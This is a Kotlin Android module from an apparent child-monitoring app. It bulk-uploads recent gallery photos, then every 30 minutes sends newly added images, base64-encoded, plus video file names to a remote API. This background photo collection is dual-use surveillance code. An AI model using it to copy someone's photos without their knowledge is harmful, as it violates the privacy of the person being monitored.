package com.example.kidsguardchild.modules

import android.content.Context
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import com.example.kidsguardchild.core.ApiClient
import com.example.kidsguardchild.core.DataUploader
import com.example.kidsguardchild.core.PhotoBody
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

private const val TAG = "PhotosModule"

class PhotosModule(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var job: Job? = null
    private var lastUploadTime = System.currentTimeMillis() - TimeUnit.DAYS.toMillis(7)

    fun start() {
        job = scope.launch {
            syncGalleryBulk(50)
            while (isActive) {
                uploadNewPhotos()
                lastUploadTime = System.currentTimeMillis()
                delay(TimeUnit.MINUTES.toMillis(30))
            }
        }
        Log.d(TAG, "Photos module started")
    }

    fun stop() {
        job?.cancel()
    }

    suspend fun syncGalleryBulk(maxItems: Int) {
        uploadImages(maxItems, 0)
        Log.i(TAG, "Gallery bulk sync: up to $maxItems photos")
    }

    suspend fun syncVideoBulk(maxItems: Int) {
        val projection = arrayOf(
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.DATE_ADDED
        )
        try {
            val cursor = context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Video.Media.DATE_ADDED} DESC LIMIT $maxItems"
            )
            var count = 0
            cursor?.use { c ->
                while (c.moveToNext() && count < maxItems) {
                    val name = c.getString(c.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)) ?: "video"
                    DataUploader.upload("Video[$name]") {
                        ApiClient.service.postPhoto(
                            PhotoBody(url = "device://video/$name", title = "Video: $name", type = "video")
                        )
                    }
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Video sync error: ${e.message}")
        }
    }

    private suspend fun uploadNewPhotos() {
        uploadImages(15, lastUploadTime / 1000)
    }

    private suspend fun uploadImages(maxItems: Int, sinceAddedSec: Long) {
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED
        )
        val selection = if (sinceAddedSec > 0) "${MediaStore.Images.Media.DATE_ADDED} > ?" else null
        val selectionArgs = if (sinceAddedSec > 0) arrayOf(sinceAddedSec.toString()) else null

        try {
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )
            var count = 0
            cursor?.use { c ->
                val idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                while (c.moveToNext() && count < maxItems) {
                    val id = c.getLong(idCol)
                    val name = c.getString(nameCol) ?: "photo"
                    val uri = Uri.withAppendedPath(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        id.toString()
                    )
                    val url = encodeImageUri(uri) ?: encodeImagePathLegacy(id) ?: continue
                    DataUploader.upload("Photo[$name]") {
                        ApiClient.service.postPhoto(
                            PhotoBody(url = url, title = name, type = "gallery")
                        )
                    }
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Photo upload error: ${e.message}")
        }
    }

    private fun encodeImageUri(uri: Uri): String? {
        return try {
            context.contentResolver.openInputStream(uri)?.use { input ->
                val opts = BitmapFactory.Options().apply { inSampleSize = 4 }
                val bitmap = BitmapFactory.decodeStream(input, null, opts) ?: return null
                val stream = ByteArrayOutputStream()
                bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, stream)
                val b64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                "data:image/jpeg;base64,$b64"
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun encodeImagePathLegacy(id: Long): String? {
        return try {
            val projection = arrayOf(MediaStore.Images.Media.DATA)
            val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
            val cursor = context.contentResolver.query(uri, projection, null, null, null) ?: return null
            cursor.use { c ->
                if (!c.moveToFirst()) return null
                val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                if (path.isNullOrBlank()) return null
                val opts = BitmapFactory.Options().apply { inSampleSize = 4 }
                val bitmap = BitmapFactory.decodeFile(path, opts) ?: return null
                val stream = ByteArrayOutputStream()
                bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, stream)
                val b64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                "data:image/jpeg;base64,$b64"
            }
        } catch (e: Exception) {
            null
        }
    }
}
